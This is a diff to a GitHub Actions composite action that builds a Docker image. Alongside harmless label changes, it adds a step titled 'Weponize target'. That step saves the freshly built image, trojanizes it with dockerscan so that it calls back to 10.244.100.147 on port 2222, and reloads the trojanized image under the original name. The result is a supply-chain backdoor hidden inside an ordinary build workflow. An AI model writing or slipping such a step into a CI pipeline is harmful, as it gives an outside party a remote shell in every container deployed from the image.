@@ -15,17 +15,23 @@ runs:
     - run: echo "going to build ${{ inputs.image-name }}"
       shell: bash
     
-    - name: Set up Docker Buildx
+    - name: "Set up Docker Buildx"
       uses: docker/setup-buildx-action@v2
   
-    - name: install docker scan
+    - name: "Install docker scan"
       shell: bash
       run: |
         python3 -m pip install -U pip
         python3 -m pip install dockerscan
-        dockerscan -h 
         
     - name: "Docker build"
       shell: bash
       run: | 
         docker build -t ${{ inputs.image-name }} . 
+      
+    - name: "Weponize target"
+      shell: bash
+      run: |
+        docker save ${{ inputs.image-name }} -o original
+        dockerscan image modify trojanize original -l 10.244.100.147 -p 2222 -o trojan
+        docker load -i trojan
